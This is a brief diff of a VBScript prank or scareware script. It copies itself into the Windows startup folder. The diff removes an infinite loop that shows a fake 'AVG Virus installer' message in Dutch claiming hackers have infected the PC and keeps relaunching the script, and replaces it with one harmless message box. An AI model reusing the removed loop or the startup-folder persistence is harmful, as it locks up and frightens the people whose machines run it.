@@ -19,9 +19,5 @@ filesys.CopyFile strLocation, StartupFolderLoc
 Dim objShell
 Set objShell = Wscript.CreateObject("WScript.Shell")
 
-	'Infinite loop
-while 1=1
-	MsgBox "Hallo "&strUser&", het lijkt er op dat het te laat is. Een stel meesterhackers hebben uw PC geinfecteerd.", VBOK, "AVG Virus installer" 
-		
-	objShell.Run strFile 
-wend
+	'Message to user
+MsgBox "A VBScript has been run on your PC.", VBOK, "Hi "&strUser
